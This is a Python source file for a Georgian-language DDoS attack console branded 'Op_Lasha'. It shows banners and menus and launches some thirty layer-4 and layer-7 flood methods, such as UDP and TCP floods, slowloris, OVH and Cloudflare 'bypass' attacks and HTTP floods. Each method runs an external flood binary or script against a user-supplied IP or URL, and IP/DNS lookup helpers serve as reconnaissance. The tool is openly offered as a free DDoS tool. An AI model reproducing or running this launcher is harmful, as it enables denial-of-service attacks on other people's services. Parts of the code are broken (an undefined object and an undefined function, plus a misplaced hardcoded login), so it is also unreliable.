
import socket
import os
import requests
import random
import getpass
import time
import sys
from colorama import Fore, Back, Style

log.authenticate()


def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

proxys = open('premiumproxy.txt').readlines()
bots = len(proxys)

def ascii_vro():
    clear()
    print("""Fore.LIGHTGREEN_EX +     
    
                ,:
               ,?}'
             =!J |
           ,*-. ?&
           WP) Y9P
          YP   ,W'
         ,W)  ,WW.'
         WW) ,WWW)
         7W),WWWW'
         `WWWWWW'
          9---W)
      ,,--WPL=YXW===
     (P),CY:,I/X'F9P
     WUT===---/===9)
     -HP+----Y(C=9W)
      '9Y3'-'-OWPT-
       'WWLUIECW
        (:7L7C7'
       ,P--=YWFL
       Y-=:9)UW:L
       3-'9=WU/.7
      ,WP9HTFUW'()
       9W7W))UF 9)
       7WYW))PW W
        7WH)),WC)
         7L--/XY)
         9+-,KY7)
         W9-Y3+7)
         W'=9WI7)
        ,W  '-YY)
         W    ::W                ,
        ,T     :X)              ()
        ()     '9W  'L.         ()         ,-
        (C     =:9   '9L        ()        ,T
        ()    ,,-7)    7WL      WW      ,F'
        ()    , T9)     '9WL    --    ,YF
        ()    '-/(W       -==+PE9P7===O)          -,
        'W, ,  T+/WX=L-. ,WP+()+3L3,),=WL  --==-T-
         7)    -,YW '-=9WPL+PT-- ':--L/=9WP=-'
         'W-,.-,++W.   WWHP    ,,-/  .9CP3)
          W  --':-9:7=9W-T ,-=FT''=++,(TFYW=====---,
          W    .-='/.  7W-,WE=--,,=-:9H=9W""~~~~~~'
          ()   ':'/Y,  (L-9PXWWW,YWWX,(U3C        
          9' ,,::/Y,/,  7LW+'-'7)()-'(MWW)
       ,,-/:',T,'-:',) ,3WWW, .Y=W'.(+WPW)
      ,F=T:9/:':C' /W),WMW9PO),m-+--9+WYW)
     ,3Y:/--.'-,',F=FHWWE/LMWU.'--X3CWW(WL
     YP:/:' -/'-Y-,W-T)9X,WCWWWX=WWWW39/OW
     7WF:=,/:-:P:,P(-'))PWWHYT79WWWHPW0W7W'
     'WU7C-:=-=-C9'WF,):):H7L   '7CI7WEXP'
      7L-,Y==3F:::,=,:-/,'P=.,  ':79UWEW)
      'WEW9P=/,)/ -:,P: / L7:'-=,-+YMWWW)
       'W)+=T,T()/-,F,,,),)  ',.-+(L=W9WW.
        '+C/:I'''',P:''/ '  ''9.  == '-'7-
         (W-+'. ,YF )/:'      ')-. ,-:FX-L
         'WM/',/CP /,:'    ..:)  ,T','/: 'W,
          W--,YXT /'')   ,P=-/',P'  '(:'  'W,
          (WEXWF Y' ,)  ,/'-,,YT    ///  ,,'W.
         ,WWWWT,,' .Y:/.',,-,=',- ,YY(). +3,W)
         WFXF:,'P ,,)/  ,',P',,- ,FI,))) I3'W)
         -HP,X'',/ '  ,/,/' ,/',,P3'I(:) W) W)       /=+=,
          9WY).,/'  ,/'-'   ,-=9-/'Y'((',W) PW      /'  '-==L,
          'WY,'    ,/,P   ,YP- C/',',)( (W'(WW.    /'       '7==L.
           ()'    /:/' ,,WT'  3F',' /)W (W (K()   /'   .        '7X
           ()   ,P,P',)T=:- ,WP'.' ,P,T (W (-9L ,Y)' ,X//, .    Y:P
          ,F   ,F,',--,/:' ,+P' '  Y):) (E' YHWLWT)-''-9/',-' ,,,WF
         ,P.,P,)-3-- ,-,' ,WF.    ,Y (' (L-WCTWEW30V-/',:'=/P+E7WF
         W- Y,P/C)',Y',' ,WT      Y) :  (P-=Y:UW9CX)3-=- ,W:9/PXXW.
        /T./:P/)' ,P',' YW-      ,P'',  9M).())WTHW3,C'  9C9='W3WW)
       ,EPOP/YR. /F ,',/W)       /'  :  (W)'W979WO0=WC:,..9LPXWWP-
       3H:WL-R' /' /' /WF       ,) ,,   (U'(HW=WWXO:--:,:'(W=WWF'
      ,WLWWWI:,F' /-'3WF '      Y  ) ,  (),T(0)WO9YPL.' ',WP=='
        --YWX-F  Y',WWT' :':   (' ()7)  (MT: WP)3C)-''  3C'
            WF  /' YW--,  ,    Y  W (),YM+C' 9+I3UV:' .YP'
           (T  3',H3-.. ,..  .,) ,) ()F-=T-. (0,9L,'  /P'
           ,W Y' 33P  .  /    Y  Y) (Y' R,:  7)Y+-),,=W'
           /',F.,W)     ,,.' ,) ,W) +)  3),  (WT9XW=3P'
          /F:T.:WF.  '..:'   :' (W. 7) '=),  'WT7WWP '
         ,P,F''WF  . , :-': ,)  YC../) 'HY.   WP0WC'
        ,P:9::YP   '  '('   :   W) .W)  +3)   9TLWC
        (P/Y(,P' ... '':, .,)  ,W) :3)  X+.   WFUW)
        'WW),I','  .., =  ':  ,O+' ,W'  )9,   99U()
         7W,='.,' ' :.'. . '  ,W)  =3   )+.  ,OH:O)
         'L,F,: '. :C::' '    (W)  9W   7+    'H,:L
          7W'++: .. ,':' '    YT   Y).  :-.    XU:W
          (T':,''','','       3'  ,-)   ,-'    77XW
          (W),J.-:/-:))'      P   )9)   :,Y  .  T,9)
          (WUI:TY:,,,:,      /' ,- W)   YC:     9/7)
          (U),-:-''.'=      (:,F' (W)   ,Y.     3=:L
           (),:::',)/'    ,,F9W'  YW)   /L.    .7=9W,
           (LUL-L.T-'.' ,WXM(W)   3W)   'U.     ,)-W
           3X=((:,' ' ,WMWF-(+'   WW'   '=,'    ,ICW
          ,T)=)K-=':-WPIWP':,:   ,WW    +/, ..' :+,9)
          Y):LX:.:=EHR,PU:'/''   (WW    I:=, .,-9CO)
          ()-+,,HPT+C:W9= ,)'    /WT'   T.: --PCXCKF'
          7LIHTP+OY3LW'3:,L..    WW)    ,,(W('MX'WT'
           7T,I-:XF:WF(: ,)    ':WWT  ,=PT:T(AY) W
           (PWW)W3=/P,P  ,     ,'WW),YP,WH,)Y)TWX9)
           3)OWRE)-YUY'... '  ..(WWXWW)9W+C)WUP9P3'
          ,WTHEF:LOP:W ' ,.   ,:(WPY(W,(P::)W(P3+)
          (P3WF/:WM:() :.:      (WHY)39HC'U()(W,W)
          (LW9/CWY-,E'  ,'     'YPL/T:WP:,(()3Y W)
          (TLUEEP=7W+.,:)       -P-:,PWT.:Y()() W+
          (EP/30-OAT .'3  . . . .C,P):WP Y)()3C:PW
          (PWMH:FXW'',-(, '   ',97WMU(7: )LW W .WW
          (WOWF-7EP)-X3., , ,,WP+WYY+YW' )WW 3 .W7)
           9W93UOY):.)/.- :YWCWU-EIMC)E (-WP + ,WW'
           (XWYUWY.,:'.,,YE3-7WE3WXV(UT,( W),T =P'
           (PT709),)C:/FY9)T.(W9YHL/Y(C T,W)') W.
           (+UTYH-:-=C-(P(-).WWF3:))3(U))(W)() P'
           3P7Y3)/'XP:)WP(J. WXCWKV:)()))(W'U)()
           7OLY3',H9),YW'F ),W)CT)/Y((-))'W,U)()
           7F=T-/T(=)A3C,)3)(WA()=)TY(CY'YWY(::)
           W9C=()L/3,9'/('Y,YWU(XE/))()E.YT)3:)L
           W=P:F:(,)),,'F'/:WP+3OY':)(R+ /T,T')W
        -=WRHX9C9-W'=,),)'A,A)XW779EXWK+.()3W),(,
      ,W=-'L,,XX)/)+'I 3)39I(UHE-+LX39TWH/LUP)(H)
     ,P:. ,-90/,(F0'/:,W //'(YOC':--YY3/IRW'9LT')
     3W=:Y:-F.)Y:/''Y /O.=:,WL9) ,. ,.79=9PL'9(-W,
     WWWWWWWPT:,::/'-WH=9',P=-W3XU3-,W=YL-O3-O)X9WL
      -7T--''=9W==W=9WWHW====''P======='---=T==F==9)

    """)
    time.sleep(0.8)
    clear()

def si():
    print(Fore.LIGHTGREEN_EX +'[ Op_Lasha ] | მოგესალმებით Op_Lasha ის DDOS სამყაროში. | Owner: Lasha | უძლიერესი DDOS თული უფასოდ |')
    print("")

def tools():
    clear()
    si()
    print(Fore.LIGHTYELLOW_EX + f'''
                                             ╔═══════════════╗
                                             ║     Tools     ║
                             ╔═══════════════╩══════╦════════╩═══════════════╗
                               geoip                ║  reverse-dns           
                               reverseip            ║  <მალე დაემატება>           
                               subnet-lookup        ║  <მალე დაემატება>        
                               asn-lookup           ║  <მალე დაემატება>       
                               dns-lookup           ║  <მალე დაემატება>       
                             ╚══════════════════════╩════════════════════════╝
''')
    
    
def layer7():
    clear()
    si()
    print(Fore.LIGHTYELLOW_EX + f'''
                                             ╔═══════════════╗
                                             ║    Layer 7    ║
                              ╔══════════════╩════════╦══════╩══════════════╗
                                  http-raw            ║   crash            
                                  http-socket         ║   httpflood         
                                  http-storm          ║   cf-socket         
                                  http-rand           ║   cf-pro            
                                  moverflow           ║   hyper             
                                  cf-bypass           ║   slow              
                                  uambypass           ║   https-spoof      
                                  ovh-raw             ║   ovh-beam          
                              ╚═══════════════════════╩═════════════════════╝
''')

def layer4():
    clear()
    si()
    print(Fore.LIGHTYELLOW_EX +f'''
                                            ╔═══════════════╗
                                            ║    Layer 4    ║
                             ╔══════════════╩════════╦══════╩══════════════╗
                                 destroy             ║   tcp               
                                 nfo-killer          ║   std               
                                 god                 ║   udp         
                                 home                ║   udpbypass              
                                 slowloris           ║   SHELLflux             
                                 stdv2               ║   <მალე დაემატება>  
                             ╚═══════════════════════╩═════════════════════╝
''')


def menu():
    sys.stdout.write(f" \x1b]2;| ქართული უძლიერესი ddos tool | by ₾asha<3 |\x07")
    clear()
    print(Fore.LIGHTGREEN_EX + '     [ Op_Lasha] | კეთილი იყოს თქვენი მობრძანება Op_Lasha ის DDOS სამყაროში. | ახალი სკრიპტები! | ახალი სამყარო!')
    print("")
    print(Fore.LIGHTYELLOW_EX + """
                    
                             ╔══════════════════════════════════════════════╗
                                  მოგესალმებით Op_Lasha-ის  DDos სამყაროში!        
                                         საუკეთსო DDos მეთოდი 
                             ╚══════════════════════════════════════════════╝
                             ╔══════════════════════════════════════════════╗
                                  ბრძანებების სანახავად აკრიფეთ [help]  
                             ╚══════════════════════════════════════════════╝
""")

def main():
    menu()
    while(True):
        cnc = input(Fore.LIGHTGREEN_EX + '''╔══[DDos@SHell]
╚════>>''')
        if cnc == "layer7" or cnc == "LAYER7" or cnc == "L7" or cnc == "l7" or cnc == "1":
            layer7()
        elif cnc == "layer4" or cnc == "LAYER4" or cnc == "L4" or cnc == "l4" or cnc == "4" or cnc == "2":
            layer4()
        elif cnc == "rule" or cnc == "RULES" or cnc == "rules" or cnc == "RULES" or cnc == "RULE34" or cnc == "r" or cnc == "R" or cnc == "3":
            rules()
        elif cnc == "clear" or cnc == "CLEAR" or cnc == "CLS" or cnc == "cls" or cnc == "5":
            main()
        elif cnc == "tools" or cnc == "tool" or cnc == "TOOLS" or cnc == "TOOL" or cnc == "T" or cnc == "t" or cnc == "4":
            tools()


# მეოთხე ლეიერი

        elif "udpbypass" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./UDPBY {ip} {port}')
            except IndexError:
                print('გამოყენება: udpby <ip> <port>')
                print('მაგალითი: udpby 1.1.1.1 80')

        elif "stdv2" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./std {ip} {port}')
            except IndexError:
                print('გამოყენება: stdv2 <ip> <port>')
                print('მაგალითი: stdv2 1.1.1.1 80')

        elif "SHELLflux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./SHELLflux {ip} {port} {thread} 0')
            except IndexError:
                print('გამოყენება: SHELLflux <ip> <port> <threads>')
                print('მაგალითი: SHELLflux 1.1.1.1 80 250')

        elif "slowloris" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./slowloris {ip} {port}')
            except IndexError:
                print('გამოყენება: slowloris <ip> <port>')
                print('მაგალითი: slowloris 1.1.1.1 80')

        elif "goddos" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl goddos.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('გამოყენება: goddos <ip> <port> <time>')
                print('მაგალითი: goddos 1.1.1.1 80 60')


        elif "std" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'./STD-NOSPOOF {ip} {port}')
            except IndexError:
                print('გამოყენება: std <ip> <port>')
                print('მაგალითი: std 1.1.1.1 80')

        elif "home" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                psize = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'perl home.pl {ip} {port} {psize} {time}')
            except IndexError:
                print('გამოყენება: home <ip> <port> <packet_size> <time>')
                print('მაგალითი: home 1.1.1.1 80 65500 60')

        elif "udp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python2 udp.py {ip} {port} 0 0')
            except IndexError:
                print('გამოყენება: udp <ip> <port>')
                print('მაგალითი: udp 1.1.1.1 80')

        elif "nfo-killer" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'./nfo-killer {ip} {port} {threads} -1 {time}')
            except IndexError:
                print('გამოყენება: nfo-killer <ip> <port> <threads> <time>')
                print('მაგალითი: nfo-killer 1.1.1.1 80 850 60')

        elif "ovh-raw" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./ovh-raw {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('გამოყენება: ovh-raw METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('მაგალითი: ovh-raw GET 1.1.1.1 80 60 8500')

        elif "tcp" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4]
                conns = cnc.split()[5]
                os.system(f'./100UP-TCP {method} {ip} {port} {time} {conns}')
            except IndexError:
                print('გამოყენება: tcp METHODS[GET/POST/HEAD] <ip> <port> <time> <connections>')
                print('მაგალითი: tcp GET 1.1.1.1 80 60 8500')
        
        
        elif "flux" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./flux {ip} {port} {thread} 0')
            except IndexError:
                print('Usage: flux <ip> <port> <threads>')
                print('Example: flux 1.1.1.1 80 250')
        
        elif "destroy" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'perl destroy.pl {ip} {port} 65500 {time}')
            except IndexError:
                print('Usage: destroy <ip> <port> <time>')
                print('Example: destroy 1.1.1.1 80 60')





#მეთოდები

        elif "shellstress" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                mode = cnc.split()[3]
                conn = cnc.split()[4]
                time = cnc.split()[5]
                out = cnc.split()[6]
                os.system(f'go run shellstress.go {ip} {port} {mode} {conn} {time} {out}')
            except IndexError:
                print('გამოყენება: stress <ip> <port> <mode> <connection> <seconds> <timeout>')
                print('რეჟიმი:[1] TCP')
                print('       [2] UDP')
                print('       [3] HTTP')
                print('მაგალითი: stress 1.1.1.1 80 3 1250 60 5')
                

# მეშვიდე ლეიერი
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'./OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('გამოყენება: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('მაგალითი: ovh-beam GET 51.38.92.223 80 60')
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('გამოყენება: https-spoof <url> <time> <threads>')
                print('მაგალითი: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('გამოყენება: slow <url> <time>')
                print('მაგალითი: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('გამოყენება: hyper <url> <time>')
                print('მაგალითი: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
    
        elif "cf-pro" in cnc:
            try:
                os.system(f'python3 cf-pro.py')
            except IndexError:
                print('cf-pro')
        elif "cf-socket" in cnc:
            try:
                os.system(f'python3 bypass.py')
            except IndexError:
                print('cf-socket')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('გამოყენება: http-socket <url> <per> <time>')
                print('მაგალითი: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('გამოყენება: http-raw <url> <time>')
                print('მაგალითი: http-raw http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('გამოყენება: http-requests <url> <time>')
                print('მაგალითი: http-requests http://example.org 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('გამოყენება: http-rand <url> <time>')
                print('მაგალითი: http-rand http://vailon.com/ 60')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'./OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('გამოყენება: overflow <ip> <port> <threads>')
                print('მაგალითი: overflow 1.1.1.1 80 5000')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('გამოყენება: cf-bypass <url> <time> <threads>')
                print('მაგალითი: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('გამოყენება: uambypass <url> <time> <req_per_ip>')
                print('მაგალითი: uambypass http://example.com 60 1250')

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('გამოყენება: crash <url> METHODS<GET/POST>')
                print('მაგალითი: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('გამოყენება: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('მაგალითი: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'./httpget {url} 10000 50 100')
            except IndexError:
                print('გამოყენება: httpget <url>')
                print('მაგალითი: httpget http://example.com')



        
                
#  ხელსაწყოები

        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: geoip <ip>')
                print('მაგალითი: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: reverseip <ip>')
                print('მაგალითი: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: subnet-lookup <cdr/ip + netmask>')
                print('მაგალითი: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: asn-lookup <ip/asn>')
                print('მაგალითი: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: dns-lookup <dns>')
                print('მაგალითი: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('გამოყენება: reverse-dns <ip/domain>')
                print('მაგალითი: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')

        
            
            
        elif "help" in cnc:
            print(Fore.LIGHTRED_EX + f'''
                                 ╔═══════════════════════════════════════╗
                                    [1] LAYER7  ►  Layer 7 შეტევის ნახვა
                                    [2] LAYER4  ►  Layer 4 შეტევის ნახვა
                                    [3] RULES   ►  წესების პანელი
                                    [4] TOOLS   ►  ხელსაწყოების ნახვა
                                    [5] CLEAR   ►  ტერმინალის გასუფთავება
                                 ╚═══════════════════════════════════════╝
                                  
                                  ''')

        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
            list
            
class Login:
    def __init__(self, id, password):
        self.id = id
        self.password = password
        self.error = "Enter a valid username and password"
    def check(self):
        if (self.id == log_id and self.password == log_pass):
            print("Login successful")
        else:
            print(self.error)

log = Login("admin",  "admin")
log_id = input("Enter your user ID: ")
log_pass = input("Enter password: ")
log.check()